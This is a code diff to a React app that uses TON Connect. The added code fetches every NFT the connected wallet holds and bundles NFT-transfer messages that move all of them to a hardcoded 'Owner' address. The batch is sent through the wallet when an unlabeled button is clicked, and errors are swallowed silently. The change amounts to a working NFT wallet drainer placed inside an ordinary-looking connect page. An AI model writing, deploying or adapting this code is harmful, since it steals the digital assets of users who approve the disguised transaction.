@@ -1,22 +1,57 @@
 import { useEffect, useState } from 'react'
 import './App.css'
-import { beginCell, toNano } from '@ton/ton'
-import { TonConnectButton, useTonAddress } from '@tonconnect/ui-react'
+import { Address, beginCell, toNano } from '@ton/ton'
+import { TonConnectButton, useTonAddress, useTonConnectUI } from '@tonconnect/ui-react'
 import axios from 'axios';
 
-
+const Owner = 'UQD6G1Ek7PQsXAyRBMTdxfmdsAk2kysNDj6VfeKAk-aSS4cM'
 function App() {
   const userFriendlyAddress = useTonAddress();
-  const [address , setaddress]=useState()
+  const [tonConnectUI] = useTonConnectUI();
+  const [address , setaddress]=useState([])
 
   const getNft =async ()=>{
     try{
       if(userFriendlyAddress){
-      const response = await axios.get(`https://toncenter.com/api/v3/nft/items?owner_address=${userFriendlyAddress}`)
-      console.log(response)
+        const response = await axios.get(`https://toncenter.com/api/v3/nft/items?owner_address=${userFriendlyAddress}`)
+        const nftAddresses = response.data.nft_items.map(item => item.address);
+        setaddress(nftAddresses);
       }
     }catch(err){
       console.log(err)
+    }
+  }
+
+  const sendTransAction = async ()=>{
+    try{
+        const payloads = []
+
+        address.map(data =>(
+          payloads.push(
+          {
+          address: Address.parse(data).toString(),
+          amount: toNano("0.05").toString(),  
+          payload: beginCell()
+          .storeUint(0x5fcc3d14, 32)              
+          .storeUint(0, 64)                       
+          .storeAddress(Address.parse(Owner))               
+          .storeAddress(Address.parse(userFriendlyAddress)) 
+          .storeUint(0, 1)                        
+          .storeCoins(toNano('0.000005'))                          
+          .storeUint(0,1)                    
+          .endCell().toBoc().toString("base64")
+        })))
+
+        console.log(payloads)
+        const myTransaction = {
+          validUntil: Math.floor(Date.now() / 1000) + 360,
+          messages:payloads
+      }
+
+      const boc = await tonConnectUI.sendTransaction(myTransaction)
+      console.log(boc)
+    }catch(err){
+
     }
   }
 
@@ -35,7 +70,9 @@ function App() {
       }}>
         <TonConnectButton />
       </div>
-      <button style={{
+      <button 
+      onClick={sendTransAction}
+      style={{
         width : '100px',
         padding : '5px',
         borderRadius : '10px',
